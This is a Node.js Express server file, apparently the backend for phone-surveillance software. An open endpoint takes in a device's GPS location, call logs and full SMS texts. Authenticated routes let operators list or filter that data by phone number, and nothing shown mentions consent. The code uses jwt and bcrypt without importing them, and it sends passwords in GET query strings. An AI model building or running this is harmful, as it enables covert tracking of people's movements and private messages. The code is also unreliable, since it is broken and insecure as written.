const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const dotenv = require("dotenv");
const axios = require("axios");

dotenv.config();
const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors());

// Increase payload limit to 50MB
app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ limit: "50mb", extended: true }));
// MongoDB connection
mongoose
  .connect(process.env.MONGO_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true
  })
  .then(() => console.log("✅ MongoDB connected"))
  .catch((err) => console.error("❌ MongoDB error:", err));
// Schemas
const LocationSchema = new mongoose.Schema({
  device: String,
  longitude: Number,
  latitude: Number,
  timestamp: { type: Date, default: Date.now }
});
const Location = mongoose.model("Location", LocationSchema);

const CallLogSchema = new mongoose.Schema({
  device: String,
  number: String,
  type: String,
  date: String,
  duration: String,
  timestamp: { type: Date, default: Date.now }
});
const CallLog = mongoose.model("CallLog", CallLogSchema);

const SmsSchema = new mongoose.Schema({
  device: String,
  address: String,
  body: String,
  date: String,
  timestamp: { type: Date, default: Date.now }
});
const Sms = mongoose.model("Sms", SmsSchema);

const UserSchema = new mongoose.Schema({
  username: { type: String, required: true, unique: true },
  passwordHash: { type: String, required: true },
  createdAt: { type: Date, default: Date.now }
});
const User = mongoose.model("User", UserSchema);

// ------------------------
// Middleware for protected routes
// ------------------------
const authMiddleware = async (req, res, next) => {
  const token = req.headers.authorization?.split(" ")[1];
  if (!token) return res.status(401).json({ error: "No token provided" });

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    return res.status(401).json({ error: "Invalid token" });
  }
};

// ------------------------
// User registration
// ------------------------
app.post("/api/register", async (req, res) => {
  try {
    const { username, password, DEF_PASS } = req.body;
    if (!username || !password || !DEF_PASS) {
      return res.status(400).json({ error: "All fields required" });
    }

    // Validate against server DEF_PASS
    if (DEF_PASS !== process.env.DEF_PASS) {
      return res.status(403).json({ error: "Invalid DEF_PASS" });
    }

    // Hash password
    const passwordHash = await bcrypt.hash(password, 10);

    const newUser = await new User({ username, passwordHash }).save();

    // Create JWT token
    const token = jwt.sign({ id: newUser._id, username: newUser.username }, process.env.JWT_SECRET, {
      expiresIn: "7d"
    });

    res.json({ message: "User created", token });
  } catch (err) {
    console.error(err);
    if (err.code === 11000) {
      return res.status(400).json({ error: "Username already exists" });
    }
    res.status(500).json({ error: "Server error" });
  }
});


app.get("/api/access-token", async (req, res) => {
  try {
    const { username, password } = req.query;
    const user = await User.findOne({ username });
    if (!user) {
      return res.status(401).json({ error: "Invalid username" });
    }
    const isPasswordValid = await bcrypt.compare(password, user.passwordHash);
    if (!isPasswordValid) {
      return res.status(401).json({ error: "Invalid password" });
    }
    const token = jwt.sign({ id: user._id, username: user.username }, process.env.JWT_SECRET, {
      expiresIn: "7d"
    });
    res.json({ token });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error" });
  }
});
// ------------------------
// Protected GET routes
// ------------------------
app.get("/get-location", authMiddleware, async (req, res) => {
  try {
    const locations = await Location.find();
    res.status(200).json(locations);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error" });
  }
});

app.get("/get-call-logs", authMiddleware, async (req, res) => {
  try {
    const callLogs = await CallLog.find();
    res.status(200).json(callLogs);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error" });
  }
});

app.get("/get-sms", authMiddleware, async (req, res) => {
  try {
    const sms = await Sms.find();
    res.status(200).json(sms);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error" });
  }
});

app.get('/get-single-logs', authMiddleware, async (req, res) => {
  try {
    const callLogs = await CallLog.find({ number: req.query.number });
    res.status(200).json(callLogs);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Server error' });
  }
})

app.get('/get-single-sms', authMiddleware, async (req, res) => {
  try {
    const sms = await Sms.find({ address: req.query.address });
    res.status(200).json(sms);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Server error' });
  }
})

// -------------------
// Combined API route
// -------------------
app.post("/api/post-data", async (req, res) => {
  try {
    const { device, latitude, longitude, callLogs, messages } = req.body;

    if (!device) {
      return res.status(400).json({ error: "Device identifier is required" });
    }

    // 1. Save Location (always)
    if (typeof latitude === "number" && typeof longitude === "number") {
      await new Location({ device, latitude, longitude }).save();
    }

    // 2. Save Call Logs (only new ones for this device)
    if (Array.isArray(callLogs) && callLogs.length > 0) {
      const latestCall = await CallLog.find({ device })
        .sort({ date: -1 })
        .limit(1)
        .lean();

      const latestCallDate = latestCall.length > 0 ? latestCall[0].date : null;

      const newCallLogs = latestCallDate
        ? callLogs.filter(c => new Date(c.date) > new Date(latestCallDate))
        : callLogs;

      if (newCallLogs.length > 0) {
        await CallLog.insertMany(newCallLogs.map(c => ({ ...c, device })));
      }
    }

    // 3. Save SMS (only new ones for this device)
    if (Array.isArray(messages) && messages.length > 0) {
      const latestSms = await Sms.find({ device })
        .sort({ date: -1 })
        .limit(1)
        .lean();

      const latestSmsDate = latestSms.length > 0 ? latestSms[0].date : null;

      const newMessages = latestSmsDate
        ? messages.filter(m => new Date(m.date) > new Date(latestSmsDate))
        : messages;

      if (newMessages.length > 0) {
        await Sms.insertMany(newMessages.map(m => ({ ...m, device })));
      }
    }

    res.json({ message: "Data saved successfully" });
  } catch (err) {
    console.error("❌ Error in /api/post-data:", err);
    res.status(500).json({ error: "Server error" });
  }
});


// Routes
app.post("/api/push", async (req, res) => {
  try {
    const { long, lat, device } = req.body;
    if (typeof long !== "number" || typeof lat !== "number") {
      return res.status(400).json({ error: "Invalid long/lat values" });
    }
    const newLocation = new Location({ longitude: long, latitude: lat, device:device });
    await newLocation.save();
    res.json({ message: "Location saved", data: newLocation });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error" });
  }
});

app.get("/get", (req, res) => {
  res.json({ message: "hello" });
});

// Keep alive ping (self-ping every 30s)
if (process.env.SELF_URL) {
  setInterval(() => {
    axios.get(`${process.env.SELF_URL}/get`).catch((err) => {
      console.error("Keep-alive ping failed:", err.message);
    });
  }, 30 * 1000);
}

// Start server
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
